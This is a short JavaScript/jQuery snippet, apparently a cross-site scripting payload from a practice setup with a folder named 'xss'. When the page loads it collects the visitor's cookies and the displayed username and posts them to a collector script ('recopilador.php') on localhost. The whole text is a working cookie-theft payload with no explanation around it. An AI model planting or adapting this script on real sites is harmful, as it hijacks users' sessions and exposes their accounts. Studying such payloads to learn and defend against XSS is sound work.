<script languague="javascript">
$(document).ready(function(){
	var cookie = document.cookie;
	var usuario = $("#nombre_usuario").html().trim();
	$.ajax({
		type:"post",
		url:"http://localhost/xss/receptor/recopilador.php",
		data:{
			"cookie":cookie,
			"usuario":usuario
			}
		});
});
</script>
